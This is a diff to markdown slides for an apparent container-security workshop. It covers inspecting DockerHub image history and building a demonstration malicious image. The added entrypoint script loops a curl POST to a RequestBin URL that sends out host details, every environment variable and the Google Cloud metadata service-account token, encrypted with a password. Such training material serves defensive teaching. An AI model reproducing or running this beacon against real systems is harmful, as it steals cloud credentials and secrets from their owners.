@@ -169,13 +169,13 @@ docker image history history_test
 ### Slide 29 - Exercise: Exploring Container Images and History from DockerHub
 
 ```
-docker search wellsfargo
+docker search dropboxservice
 ```
 
 ### Slide 30 - Docker Image History
 
 ```
-docker pull wellsfargo102/upload
+docker pull mkefi/dropboxservice:latest
 ```
 
 ```
@@ -183,11 +183,11 @@ docker image ls
 ```
 
 ```
-docker history wellsfargo102/upload
+docker history mkefi/dropboxservice
 ```
 
 ```
-docker history --no-trunc --format "{{.CreatedAt}}: {{.CreatedBy}}" wellsfargo102/upload |less
+docker history --no-trunc --format "{{.CreatedAt}}: {{.CreatedBy}}" mkefi/dropboxservice |less
 ```
 
 > Use up and down arrow keys or `[SPACE]` to navigate, type `q` to quit
@@ -195,12 +195,12 @@ docker history --no-trunc --format "{{.CreatedAt}}: {{.CreatedBy}}" wellsfargo10
 ### Slide 32 - Extract without running
 
 ```
-docker create wellsfargo102/upload
+docker create mkefi/dropboxservice
 ```
 
 Note: Replace $container_id with Container ID returned by last command (only need first part)
 ```
-docker cp $container_id:/app.jar /tmp/app.jar
+docker cp $container_id:/dropboxservice.jar /tmp/app.jar
 ```
 ```
 ls /tmp/*.jar
@@ -322,6 +322,8 @@ ENV URL REQUESTBIN_URL
 ENV UA "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7"
 # Replace HANDLE with your l33t hacker name or some other identifying designation
 ENV USER HANDLE
+# add a password 
+ENV PW PASSWORD
 ENTRYPOINT ["/usr/bin/tini", "--", "/docker-entrypoint.sh"]
 ```
 > After pasting, hit `[ESC]`, then type `:wq`
@@ -339,12 +341,14 @@ Paste the below script into the vi after hitting `i` for insert
 if [ "shell" = "${1}" ]; then
   /bin/bash
 else
-  while true
-  do
-    sleep 30
-    curl -s  -X POST -A "${UA}" -H "X-User: ${USER}" -H "Cookie: `uname -a | gzip | base64 -w0`" $URL
-    echo
-  done
+ while true
+ do
+	sleep 30
+	curl -s  -X POST -A "${UA}" -H "X-User: ${USER}" -H "Cookie: `uname -a | gzip | base64 -w0`" -d \
+`{ env && curl -s -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token; } | gzip | openssl enc -e -aes-256-cbc -md sha512 -pbkdf2 -salt -a -pass "pass:${PW}" | base64 -w0` \
+$URL
+	echo
+ done
 fi
 ```
 > After pasting, hit `ESC`, then type `:wq`
